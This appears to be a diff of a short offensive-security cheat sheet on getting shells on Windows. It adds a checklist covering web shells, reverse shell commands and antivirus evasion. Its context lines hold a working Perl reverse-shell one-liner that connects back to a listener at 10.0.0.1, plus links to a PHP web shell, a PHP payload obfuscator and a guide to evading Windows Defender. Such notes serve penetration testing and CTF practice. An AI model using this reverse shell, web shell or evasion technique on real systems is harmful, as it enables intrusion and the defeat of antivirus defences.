@@ -1,5 +1,8 @@
 # Windows Shells 
 Remember to check for AV before uploading common payloads! 
+- [ ] Web Shells 
+- [ ] Reverse Shell Commands 
+- [ ] Antivirus evasion 
 
 ## Web Shells 
 [White winter wolf Linux and Windows web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) 
@@ -23,7 +26,7 @@ Perl
     perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:53");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'  
     
     
-## Obfuscating Payloads 
+## Antivirus Evasion  
 [PHP payload encoder](https://www.gaijin.at/en/tools/php-obfuscator#result) 
 
 [Example - obfuscating payload to get a reverse shell on Windows](https://medium.com/@defsecone/evading-windows-defender-using-obfuscation-techniques-2494b2924807) 
